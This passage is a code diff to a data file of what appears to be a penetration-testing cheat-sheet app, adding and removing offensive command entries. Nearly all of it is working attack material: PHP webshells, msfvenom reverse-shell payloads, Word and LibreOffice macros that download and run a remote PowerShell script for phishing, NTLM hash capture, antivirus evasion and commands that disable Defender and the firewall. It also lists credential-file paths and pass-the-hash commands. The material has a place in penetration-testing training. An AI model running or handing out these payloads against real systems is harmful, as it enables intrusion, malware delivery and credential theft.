+              "REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1",
+              "cmd.exe /c winpeas.exe"
             ]
           }
         ]
@@ -2031,7 +3548,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "PHP One-Liners",
-            "subdesc": "",
+            "subdesc": "Upload via file upload vuln, LFI log poisoning, or SQL injection. Access: ?cmd=whoami",
             "cmd": [
               "<?php echo system($_GET['cmd']); ?>",
               "<?php echo exec($_GET['cmd']); ?>",
@@ -2040,54 +3557,166 @@ const checklistPhases = [
           },
           {
             "desc": "Minimal",
-            "subdesc": "",
+            "subdesc": "Shortest possible webshell — uses REQUEST (GET or POST). Access: ?c=id",
             "cmd": [
               "<?php system($_REQUEST['c']); ?>"
             ]
           },
           {
             "desc": "MySQL INTO OUTFILE Webshell",
-            "subdesc": "",
+            "subdesc": "Requires FILE privilege and writable web directory. Adjust path for target OS",
             "cmd": [
               "SELECT \"<?php if(isset($_GET['cmd'])) { system($_GET['cmd'] . ' 2>&1'); } ?>\" INTO OUTFILE \"C:/wamp/www/webshell.php\";"
             ]
           },
           {
             "desc": "Kali Webshells",
-            "subdesc": "",
+            "subdesc": "Pre-installed webshells in Kali — PHP, ASP, JSP, CFM variants available",
             "cmd": [
               "/usr/share/webshells/php/"
+            ]
+          },
+          {
+            "desc": "Alternative PHP Webshell",
+            "subdesc": "Includes stderr redirect (2>&1) for better error output visibility",
+            "cmd": [
+              "<?php if(isset($_GET['cmd'])) { system($_GET['cmd'] . ' 2>&1'); } ?>"
+            ]
+          },
+          {
+            "desc": "Alternative PHP Webshell (REQUEST)",
+            "subdesc": "REQUEST accepts both GET and POST — more flexible than GET-only shells",
+            "cmd": [
+              "<?php if (isset($_REQUEST['cmd'])) {system($_REQUEST['cmd']);} ?>"
             ]
           }
         ]
       },
       {
-        "id": "exploit-23",
-        "name": "Reverse Shell (Setup Listener)",
-        "description": "Netcat, rlwrap, and Metasploit multi/handler listeners.",
+        "id": "exploit-msf",
+        "name": "Metasploit / msfvenom",
+        "description": "Metasploit framework setup, msfvenom payload generation (Windows/Linux), and multi/handler listener.",
         "commands": [
           {
-            "desc": "Netcat Listener",
-            "subdesc": "",
+            "desc": "Initialize Metasploit DB",
+            "subdesc": "Required before using database features (hosts, services, creds tracking)",
             "cmd": [
-              "nc -lvnp <LPORT>"
+              "sudo msfdb init",
+              "msfconsole"
             ]
           },
           {
-            "desc": "Wrapped Listener (Windows targets)",
-            "subdesc": "",
+            "desc": "Workspaces",
+            "subdesc": "Isolate data per engagement — each workspace has its own hosts, services, and loot",
             "cmd": [
-              "rlwrap nc -lvnp <LPORT>"
+              "workspace -a <NAME>",
+              "workspace <NAME>",
+              "workspace -d <NAME>"
             ]
           },
           {
-            "desc": "Metasploit Multi/Handler",
-            "subdesc": "",
+            "desc": "Auxiliary Modules",
+            "subdesc": "Scanners, fuzzers, and enumeration modules — use 'search' to find relevant ones",
             "cmd": [
-              "msfconsole -q",
+              "search type:auxiliary <SERVICE>",
+              "use auxiliary/scanner/<MODULE>",
+              "set RHOSTS <TARGET_IP>",
+              "run"
+            ]
+          },
+          {
+            "desc": "Meterpreter Basics",
+            "subdesc": "Interactive post-exploitation shell. Use 'background' to return to msf console without killing session",
+            "cmd": [
+              "sysinfo",
+              "getuid",
+              "shell",
+              "background",
+              "sessions -l",
+              "sessions -i <ID>"
+            ]
+          },
+          {
+            "desc": "msfvenom: Windows x86 Staged (.exe)",
+            "subdesc": "Staged payloads (/) are smaller but require a handler. Use for size-constrained scenarios",
+            "cmd": [
+              "msfvenom -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell_staged.exe"
+            ]
+          },
+          {
+            "desc": "msfvenom: Windows x86 Stageless (.exe)",
+            "subdesc": "Stageless payloads (_) are self-contained — more reliable but larger",
+            "cmd": [
+              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe"
+            ]
+          },
+          {
+            "desc": "msfvenom: Windows x64 Staged (.exe)",
+            "subdesc": "Use x64 payloads for modern 64-bit Windows targets",
+            "cmd": [
+              "msfvenom -p windows/x64/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell64_staged.exe"
+            ]
+          },
+          {
+            "desc": "msfvenom: Windows x64 Stageless (.exe)",
+            "subdesc": "Self-contained — no handler needed for initial execution, more reliable",
+            "cmd": [
+              "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell64.exe"
+            ]
+          },
+          {
+            "desc": "msfvenom: Windows Shellcode (C / PowerShell)",
+            "subdesc": "Raw shellcode for embedding in custom loaders",
+            "cmd": [
+              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c",
+              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh-cmd"
+            ]
+          },
+          {
+            "desc": "msfvenom: Windows Other Formats",
+            "subdesc": "ASP for IIS, DLL for DLL hijacking, HTA for browser delivery, PS1 for PowerShell",
+            "cmd": [
+              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o shell.asp",
+              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll",
+              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hta-psh -o shell.hta",
+              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1"
+            ]
+          },
+          {
+            "desc": "msfvenom: Linux x64 ELF",
+            "subdesc": "Standard Linux payload — chmod +x before executing on target",
+            "cmd": [
+              "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf"
+            ]
+          },
+          {
+            "desc": "msfvenom: Linux x64 Stageless ELF",
+            "subdesc": "Self-contained Linux payload — no handler dependency on initial connect",
+            "cmd": [
+              "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell_stageless.elf"
+            ]
+          },
+          {
+            "desc": "msfvenom: Linux Shellcode (C)",
+            "subdesc": "Raw C shellcode for embedding in custom Linux exploits or loaders",
+            "cmd": [
+              "msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c"
+            ]
+          },
+          {
+            "desc": "msfvenom: Format Options",
+            "subdesc": "Common output formats: exe, elf, dll, asp, jsp, war, py, ps1, psh, psh-cmd, hta-psh, c, raw, hex",
+            "cmd": [
+              "msfvenom --list formats"
+            ]
+          },
+          {
+            "desc": "Multi/Handler Listener",
+            "subdesc": "Must match the payload used in msfvenom. Use staged handler for staged payloads",
+            "cmd": [
               "use exploit/multi/handler",
-              "set PAYLOAD <payload>",
-              "set LHOST 0.0.0.0",
+              "set payload windows/x64/shell_reverse_tcp",
+              "set LHOST <LHOST>",
               "set LPORT <LPORT>",
               "run"
             ]
@@ -2095,217 +3724,96 @@ const checklistPhases = [
         ]
       },
       {
-        "id": "exploit-24",
-        "name": "Reverse Shell Payloads",
-        "description": "Bash, Python, PowerShell (powercat, Nishang) reverse shell payloads.",
+        "id": "exploit-shellcode",
+        "name": "Shellcode Execution (Windows)",
+        "description": "Generate shellcode with msfvenom and execute via PowerShell Reflection using Windows API (VirtualAlloc, CreateThread).",
         "commands": [
           {
-            "desc": "linux: Bash",
-            "subdesc": "",
+            "desc": "Generate Shellcode",
+            "subdesc": "Output in PowerShell format for direct use in the runner script below",
             "cmd": [
-              "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
+              "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f powershell"
             ]
           },
           {
-            "desc": "linux: Python",
-            "subdesc": "",
+            "desc": "PowerShell Shellcode Runner",
+            "subdesc": "Uses VirtualAlloc, CreateThread, and WaitForSingleObject via C# interop. Replace SHELLCODE_PLACEHOLDER with msfvenom output",
             "cmd": [
-              "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+              "# Key Windows API flow:",
+              "# 1. VirtualAlloc - allocate RWX memory (0x3000 = reserve+commit, 0x40 = exec_readwrite)",
+              "# 2. Marshal.Copy - copy shellcode bytes into allocated memory",
+              "# 3. CreateThread - execute shellcode from memory address",
+              "# 4. WaitForSingleObject - wait for shellcode to complete",
+              "",
+              "# Full script: define C# classes with DllImport for kernel32 functions,",
+              "# Add-Type them, store shellcode in $buf, allocate+copy+execute"
             ]
           },
           {
-            "desc": "windows: PowerShell (powercat)",
-            "subdesc": "",
+            "desc": "Key Concepts",
+            "subdesc": "PowerShell Reflection enables calling Windows API at runtime without compiled binaries — stealthier than dropping .exe files",
             "cmd": [
-              "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
-            ]
-          },
-          {
-            "desc": "windows: PowerShell (Nishang)",
-            "subdesc": "",
-            "cmd": [
-              "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>\""
-            ]
-          },
-          {
-            "desc": "windows: PowerShell Download & Exec",
-            "subdesc": "",
-            "cmd": [
-              "powershell -c 'IEX(IWR http://<LHOST>/revshell.ps1 -UseBasicParsing)'"
+              "# VirtualAlloc: allocates memory in process address space",
+              "# CreateThread: creates new thread to execute shellcode",
+              "# WaitForSingleObject: pauses until shellcode thread completes"
             ]
           }
         ]
       },
       {
-        "id": "exploit-25",
-        "name": "Shell Upgrade / Stabilize",
-        "description": "Python PTY spawn, stty raw, script method, and terminal size fix.",
+        "id": "exploit-macros",
+        "name": "Malicious Macros",
+        "description": "Word/LibreOffice VBA macros for PowerShell download-and-execute payloads.",
         "commands": [
           {
-            "desc": "Python PTY",
-            "subdesc": "",
+            "desc": "Word VBA Macro (AutoOpen)",
+            "subdesc": "Triggers when document is opened. Use Document_Open as backup — some versions prefer it",
             "cmd": [
-              "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
-              "export TERM=xterm"
+              "Sub AutoOpen()",
+              "  CreateObject(\"Wscript.Shell\").Run \"cmd /c powershell -ep bypass -nop IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"",
+              "End Sub"
             ]
           },
           {
-            "desc": "Background & Raw Mode",
-            "subdesc": "Ctrl+Z then:",
+            "desc": "Word VBA Macro (Document_Open)",
+            "subdesc": "Alternative trigger — use if AutoOpen doesn't fire. Both can be included for reliability",
             "cmd": [
-              "stty raw -echo; fg"
+              "Sub Document_Open()",
+              "  CreateObject(\"Wscript.Shell\").Run \"cmd /c powershell -ep bypass -nop IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"",
+              "End Sub"
             ]
           },
           {
-            "desc": "Fix Terminal Size",
-            "subdesc": "",
+            "desc": "NTLMv2 Capture via Macro",
+            "subdesc": "Trigger an SMB auth request to your Responder listener — captures NTLMv2 hashes",
             "cmd": [
-              "stty rows 38 columns 116"
+              "Sub AutoOpen()",
+              "  CreateObject(\"Wscript.Shell\").Run \"cmd /c dir \\\\<LHOST>\\share\"",
+              "End Sub",
+              "# On attacker: sudo responder -I tun0"
             ]
           },
           {
-            "desc": "Script Method",
-            "subdesc": "",
+            "desc": "LibreOffice Macro",
+            "subdesc": "Tools → Macros → Organize → Basic → assign macro to Open Document event",
             "cmd": [
-              "script -qc /bin/bash /dev/null"
+              "Sub Main",
+              "  Shell(\"cmd /c powershell -ep bypass -nop IWR -uri http://<LHOST>/shell.ps1 -OutFile C:\\Windows\\Temp\\shell.ps1; C:\\Windows\\Temp\\shell.ps1\")",
+              "End Sub"
             ]
           },
           {
-            "desc": "Wrapped Listener (before catching)",
-            "subdesc": "",
+            "desc": "macro-generator.py",
+            "subdesc": "Generates AutoOpen/Document_Open VBA stagers. Supports .doc VBA-EXE method, IWR cradle, and LibreOffice ODT",
             "cmd": [
-              "rlwrap nc -lvnp <LPORT>"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-26",
-        "name": "Password Brute Force",
-        "description": "Hydra brute force for SSH, RDP, HTTP forms, FTP, and SMB.",
-        "commands": [
-          {
-            "desc": "SSH",
-            "subdesc": "",
-            "cmd": [
-              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>"
+              "python3 macro-generator.py <LHOST> <LPORT>"
             ]
           },
           {
-            "desc": "RDP",
-            "subdesc": "",
+            "desc": "Delivery",
+            "subdesc": "Embed in .doc/.docm, send via phishing. .docx does NOT support macros",
             "cmd": [
-              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>"
-            ]
-          },
-          {
-            "desc": "HTTP POST Form",
-            "subdesc": "",
-            "cmd": [
-              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \"/login:username=^USER^&password=^PASS^:F=incorrect\""
-            ]
-          },
-          {
-            "desc": "HTTP GET (Basic Auth)",
-            "subdesc": "",
-            "cmd": [
-              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /protected"
-            ]
-          },
-          {
-            "desc": "FTP",
-            "subdesc": "",
-            "cmd": [
-              "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>"
-            ]
-          },
-          {
-            "desc": "SMB",
-            "subdesc": "",
-            "cmd": [
-              "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://<TARGET_IP>"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-27",
-        "name": "Hash Cracking",
-        "description": "Hash identification, Hashcat modes/rules, John the Ripper, and unshadow.",
-        "commands": [
-          {
-            "desc": "Identify Hash Type",
-            "subdesc": "",
-            "cmd": [
-              "hashid -m <HASH>",
-              "hash-identifier"
-            ]
-          },
-          {
-            "desc": "Hashcat",
-            "subdesc": "Common modes: 0=MD5, 100=SHA1, 1400=SHA256, 1800=sha512crypt, 3200=bcrypt, 1000=NTLM, 5600=NetNTLMv2",
-            "cmd": [
-              "hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt",
-              "hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
-            ]
-          },
-          {
-            "desc": "John the Ripper",
-            "subdesc": "",
-            "cmd": [
-              "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
-              "john --show hash.txt"
-            ]
-          },
-          {
-            "desc": "Unshadow (Linux)",
-            "subdesc": "",
-            "cmd": [
-              "unshadow passwd shadow > unshadowed.txt",
-              "john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-28",
-        "name": "File Transfer to Target",
-        "description": "Python HTTP server, impacket-smbserver, certutil, PowerShell IWR, curl, wget, scp, and FTP.",
-        "commands": [
-          {
-            "desc": "Attacker: Serve Files",
-            "subdesc": "",
-            "cmd": [
-              "python3 -m http.server 80",
-              "impacket-smbserver share . -smb2support"
-            ]
-          },
-          {
-            "desc": "linux: Download",
-            "subdesc": "",
-            "cmd": [
-              "wget http://<LHOST>/file -O /tmp/file",
-              "curl http://<LHOST>/file -o /tmp/file",
-              "scp <USER>@<LHOST>:file /tmp/file",
-              "bash -c 'cat < /dev/tcp/<LHOST>/80 > file'"
-            ]
-          },
-          {
-            "desc": "windows: Download",
-            "subdesc": "",
-            "cmd": [
-              "certutil -urlcache -f http://<LHOST>/file.exe file.exe",
-              "powershell -c \"IWR -uri http://<LHOST>/file.exe -Outfile file.exe\"",
-              "copy \\\\<LHOST>\\share\\file.exe ."
-            ]
-          },
-          {
-            "desc": "FTP (anonymous)",
-            "subdesc": "",
-            "cmd": [
-              "ftp -n <LHOST>",
-              "# USER anonymous / PASS anonymous",
-              "# get file.exe"
+              ""
             ]
           }
         ]
@@ -2313,13 +3821,20 @@ const checklistPhases = [
       {
         "id": "exploit-av-evasion",
         "name": "AV Evasion",
-        "description": "msfvenom encoding, Shellter, Veil, Donut, PS obfuscation, UPX packing, and Defender bypass.",
+        "description": "msfvenom encoding, Shellter, Veil, Donut, PS obfuscation, UPX packing, nmap evasion, and Defender bypass.",
         "commands": [
           {
-            "desc": "msfvenom Encoding",
-            "subdesc": "",
+            "desc": "msfvenom Custom Encoding",
+            "subdesc": "Encode payload multiple iterations to evade signature detection",
             "cmd": [
-              "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe"
+              "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe"
+            ]
+          },
+          {
+            "desc": "msfvenom Shellcode Output (C format)",
+            "subdesc": "Generate raw shellcode for embedding in custom loaders or scripts",
+            "cmd": [
+              "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c"
             ]
           },
           {
@@ -2338,146 +3853,77 @@ const checklistPhases = [
           },
           {
             "desc": "Donut (.NET/PE to shellcode)",
-            "subdesc": "",
+            "subdesc": "Convert .NET assemblies and PE files to position-independent shellcode",
             "cmd": [
               "donut -i payload.exe -o payload.bin"
             ]
           },
           {
             "desc": "PowerShell Obfuscation",
-            "subdesc": "",
+            "subdesc": "Install: Install-Module -Name Invoke-Obfuscation. Obfuscates PS scripts to evade AV/AMSI",
             "cmd": [
               "Invoke-Obfuscation"
             ]
           },
           {
-            "desc": "UPX Packing",
-            "subdesc": "",
+            "desc": "PowerShell Base64 One-Liner",
+            "subdesc": "Encode a PS command to base64 and run with -enc to bypass simple string detections",
             "cmd": [
-              "upx -9 payload.exe"
+              "echo -n '<powershell-command>' | iconv -f ASCII -t UTF-16LE | base64 | tr -d '\\n'",
+              "powershell.exe -nop -exec bypass -enc <ENCODED-OUTPUT>"
+            ]
+          },
+          {
+            "desc": "XOR / Hex Encoded Shells",
+            "subdesc": "Custom encoding to bypass AV — decode at runtime in your loader",
+            "cmd": [
+              "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hex"
+            ]
+          },
+          {
+            "desc": "UPX Packing",
+            "subdesc": "Strip symbols first, then pack with UPX to reduce size and change binary signature",
+            "cmd": [
+              "strip payload.exe",
+              "upx --best --ultra-brute payload.exe"
+            ]
+          },
+          {
+            "desc": "Manual Compilation",
+            "subdesc": "Compile custom C payloads directly to avoid known tool signatures",
+            "cmd": [
+              "gcc payload.c -o payload.exe"
+            ]
+          },
+          {
+            "desc": "Nmap Evasion",
+            "subdesc": "Evade IDS/firewall during scanning",
+            "cmd": [
+              "nmap -f <TARGET>                    # fragmented packets",
+              "nmap -iR 10 <TARGET>                # randomize host order",
+              "nmap --spoof-mac Dell <TARGET>      # spoof MAC vendor"
             ]
           },
           {
             "desc": "windows: Disable Defender",
-            "subdesc": "",
+            "subdesc": "Disable real-time protection to allow payload execution",
             "cmd": [
               "Set-MpPreference -DisableRealtimeMonitoring $true"
             ]
           },
           {
             "desc": "windows: Disable Firewall",
-            "subdesc": "",
+            "subdesc": "Turn off Windows Firewall on all profiles to enable C2 traffic",
             "cmd": [
-              "netsh advfirewall set allprofiles state off"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-macros",
-        "name": "Malicious Macros",
-        "description": "Word/LibreOffice VBA macros for PowerShell download-and-execute payloads.",
-        "commands": [
-          {
-            "desc": "Word VBA Macro (AutoOpen)",
-            "subdesc": "",
-            "cmd": [
-              "Sub AutoOpen()",
-              "  CreateObject(\"Wscript.Shell\").Run \"cmd /c powershell -ep bypass -nop IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"",
-              "End Sub"
+              "netsh advfirewall set allprofiles state off",
+              "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
             ]
           },
           {
-            "desc": "LibreOffice Macro",
-            "subdesc": "",
+            "desc": "windows: Disable RDP (cover tracks)",
+            "subdesc": "Stop Terminal Services to prevent admin RDP access during engagement",
             "cmd": [
-              "Sub Main",
-              "  Shell(\"cmd /c powershell -ep bypass -nop IWR -uri http://<LHOST>/shell.ps1 -OutFile C:\\Windows\\Temp\\shell.ps1; C:\\Windows\\Temp\\shell.ps1\")",
-              "End Sub"
-            ]
-          },
-          {
-            "desc": "macro-generator.py",
-            "subdesc": "",
-            "cmd": [
-              "python3 macro-generator.py <LHOST> <LPORT>"
-            ]
-          },
-          {
-            "desc": "Delivery",
-            "subdesc": "Embed in .doc/.docm, send via phishing",
-            "cmd": [
-              ""
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-bof",
-        "name": "Buffer Overflow",
-        "description": "Stack overflow methodology: spike, fuzz, offset, EIP, badchars, JMP ESP, shellcode.",
-        "commands": [
-          {
-            "desc": "1. Spiking",
-            "subdesc": "",
-            "cmd": [
-              "generic_send_tcp <TARGET> <PORT> spike.spk 0 0"
-            ]
-          },
-          {
-            "desc": "2. Fuzzing",
-            "subdesc": "Send increasing buffer until crash",
-            "cmd": [
-              ""
-            ]
-          },
-          {
-            "desc": "3. Finding Offset",
-            "subdesc": "",
-            "cmd": [
-              "msf-pattern_create -l <length>"
-            ]
-          },
-          {
-            "desc": "4. Overwriting EIP",
-            "subdesc": "",
-            "cmd": [
-              "msf-pattern_offset -l <length> -q <EIP_value>"
-            ]
-          },
-          {
-            "desc": "5. Finding Bad Characters",
-            "subdesc": "Send all chars (\\x01-\\xff), remove bad ones",
-            "cmd": [
-              ""
-            ]
-          },
-          {
-            "desc": "6. Finding Right Module",
-            "subdesc": "No ASLR/DEP/SafeSEH",
-            "cmd": [
-              "!mona modules"
-            ]
-          },
-          {
-            "desc": "7. Finding JMP ESP",
-            "subdesc": "",
-            "cmd": [
-              "!mona find -s \"\\xff\\xe4\" -m <module>"
-            ]
-          },
-          {
-            "desc": "8. Generating Shellcode",
-            "subdesc": "",
-            "cmd": [
-              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -b \"\\x00\" -f python"
-            ]
-          },
-          {
-            "desc": "Tools",
-            "subdesc": "",
-            "cmd": [
-              "Immunity Debugger + mona.py"
+              "Stop-Service TermService -Force"
             ]
           }
         ]
@@ -2489,7 +3935,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Dump Exposed .git",
-            "subdesc": "",
+            "subdesc": "Download the .git directory from web servers. git-dumper: pip install git-dumper",
             "cmd": [
               "wget -r http://<TARGET>/.git/",
               "git-dumper http://<TARGET>/.git/ <LOCAL-DIR>"
@@ -2497,7 +3943,7 @@ const checklistPhases = [
           },
           {
             "desc": "Scan for Secrets",
-            "subdesc": "",
+            "subdesc": "Install: go install github.com/zricethezav/gitleaks/v8@latest | trufflehog: go install github.com/trufflesecurity/trufflehog/v3@latest",
             "cmd": [
               "gitleaks dir -v",
               "trufflehog filesystem <LOCAL-DIR>"
@@ -2505,7 +3951,7 @@ const checklistPhases = [
           },
           {
             "desc": "Review History",
-            "subdesc": "",
+            "subdesc": "Walk through commit history looking for credentials, config changes, and removed secrets",
             "cmd": [
               "git log --oneline",
               "git show <COMMIT>",
@@ -2514,7 +3960,7 @@ const checklistPhases = [
           },
           {
             "desc": "Search for Sensitive Data",
-            "subdesc": "",
+            "subdesc": "Search all commits for keywords like password, secret, key, token — Git keeps deleted content in history",
             "cmd": [
               "git log -p --all -S 'password'",
               "git log -p --all -S 'secret'"
@@ -2529,7 +3975,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "SAM/SYSTEM (local hashes)",
-            "subdesc": "",
+            "subdesc": "Copy both files and extract NTLM hashes offline with secretsdump.py LOCAL",
             "cmd": [
               "C:\\Windows\\System32\\config\\SAM",
               "C:\\Windows\\System32\\config\\SYSTEM"
@@ -2537,7 +3983,7 @@ const checklistPhases = [
           },
           {
             "desc": "Unattend/Sysprep (cleartext creds)",
-            "subdesc": "",
+            "subdesc": "Often contain base64-encoded admin credentials from automated deployments",
             "cmd": [
               "C:\\Windows\\Panther\\Unattend.xml",
               "C:\\Windows\\Panther\\unattend\\Unattend.xml",
@@ -2546,28 +3992,28 @@ const checklistPhases = [
           },
           {
             "desc": "Web Configs",
-            "subdesc": "",
+            "subdesc": "May contain DB connection strings, API keys, and service account credentials",
             "cmd": [
               "C:\\inetpub\\wwwroot\\web.config"
             ]
           },
           {
             "desc": "PowerShell History",
-            "subdesc": "",
+            "subdesc": "Check all user profiles — often contains plaintext passwords passed as arguments",
             "cmd": [
               "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
             ]
           },
           {
             "desc": "WiFi Passwords",
-            "subdesc": "",
+            "subdesc": "Stored in cleartext — list profiles first with: netsh wlan show profiles",
             "cmd": [
               "netsh wlan show profile <NAME> key=clear"
             ]
           },
           {
             "desc": "Registry Autologon",
-            "subdesc": "",
+            "subdesc": "DefaultPassword stored in cleartext if autologon is configured",
             "cmd": [
               "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
             ]
@@ -2581,7 +4027,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "User Credentials",
-            "subdesc": "",
+            "subdesc": "Check /etc/shadow for crackable hashes, bash_history for leaked passwords, and SSH keys for lateral movement",
             "cmd": [
               "/etc/passwd",
               "/etc/shadow",
@@ -2591,7 +4037,7 @@ const checklistPhases = [
           },
           {
             "desc": "Web Application Configs",
-            "subdesc": "",
+            "subdesc": "Database credentials, API keys, and secrets — check .env files first",
             "cmd": [
               "/var/www/html/.env",
               "/var/www/html/wp-config.php",
@@ -2600,7 +4046,7 @@ const checklistPhases = [
           },
           {
             "desc": "Service Configs",
-            "subdesc": "",
+            "subdesc": "Crontabs for privilege escalation paths, NFS exports for no_root_squash abuse",
             "cmd": [
               "/etc/crontab",
               "/etc/cron.d/*",
@@ -2610,7 +4056,7 @@ const checklistPhases = [
           },
           {
             "desc": "Proc Leaks",
-            "subdesc": "",
+            "subdesc": "Environment variables and command lines may expose credentials passed at runtime",
             "cmd": [
               "/proc/self/environ",
               "/proc/self/cmdline"
@@ -2618,7 +4064,7 @@ const checklistPhases = [
           },
           {
             "desc": "SSH Configs",
-            "subdesc": "",
+            "subdesc": "Check PermitRootLogin, authorized_keys for persistence, and known_hosts for pivot targets",
             "cmd": [
               "/etc/ssh/sshd_config",
               "/root/.ssh/authorized_keys"
@@ -2627,251 +4073,47 @@ const checklistPhases = [
         ]
       },
       {
-        "id": "exploit-db",
-        "name": "Databases",
-        "description": "PostgreSQL, MySQL/MariaDB, MSSQL (xp_cmdshell, xp_dirtree), and SQLite3 commands.",
+        "id": "exploit-hashcrack",
+        "name": "Hash Cracking / Password Attacks",
+        "description": "Hash identification, hashcat modes, and offline cracking techniques.",
         "commands": [
           {
-            "desc": "PostgreSQL",
-            "subdesc": "",
+            "desc": "Identify Hash Type",
+            "subdesc": "The -m flag shows the corresponding hashcat mode number",
             "cmd": [
-              "psql -h <TARGET_IP> -U <USER> -d <DB>",
-              "\\list  \\dt  \\du",
-              "SELECT * FROM pg_shadow;"
+              "hashid -m <HASH>"
             ]
           },
           {
-            "desc": "MySQL / MariaDB",
-            "subdesc": "",
+            "desc": "Hashcat Cracking",
+            "subdesc": "Use -m to specify hash mode. Common: 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA-512, 3200=bcrypt, 5600=NTLMv2, 13100=Kerberoast",
             "cmd": [
-              "mysql -h <TARGET_IP> -u <USER> -p",
-              "SHOW DATABASES; USE <DB>; SHOW TABLES;",
-              "SELECT user, authentication_string FROM mysql.user;"
+              "hashcat -m <MODE> <HASH-FILE> <WORDLIST>",
+              "hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt"
             ]
           },
           {
-            "desc": "MSSQL",
-            "subdesc": "xp_cmdshell, xp_dirtree hash stealing",
+            "desc": "John the Ripper",
+            "subdesc": "Auto-detects hash format. Use --wordlist for dictionary attack",
             "cmd": [
-              "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>",
-              "SELECT name FROM sys.databases;",
-              "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
-              "EXEC xp_cmdshell 'whoami';",
-              "EXEC xp_dirtree '\\\\<LHOST>\\share', 1, 1;"
+              "john --wordlist=/usr/share/wordlists/rockyou.txt <HASH-FILE>",
+              "john --show <HASH-FILE>"
             ]
           },
           {
-            "desc": "SQLite",
-            "subdesc": "",
+            "desc": "Pass The Hash",
+            "subdesc": "NTLM hashes are not salted and remain static between sessions \u2014 no need to crack them",
             "cmd": [
-              "sqlite3 <file.db>",
-              ".tables",
-              "SELECT * FROM <table>;"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-tunnel",
-        "name": "Tunneling",
-        "description": "SSH local/remote/dynamic forwarding, proxychains, Chisel, and Ligolo-ng.",
-        "commands": [
-          {
-            "desc": "SSH Local Port Forward",
-            "subdesc": "Access remote:port from localhost",
-            "cmd": [
-              "ssh -L <LPORT>:<REMOTE>:<RPORT> <USER>@<PIVOT>",
-              "# Connect to: localhost:<LPORT>"
+              "crackmapexec smb <SUBNET>/24 -u administrator -H 'NTHASH'",
+              "impacket-psexec <DOMAIN>/administrator@<TARGET_IP> -hashes 'LMHASH:NTHASH'",
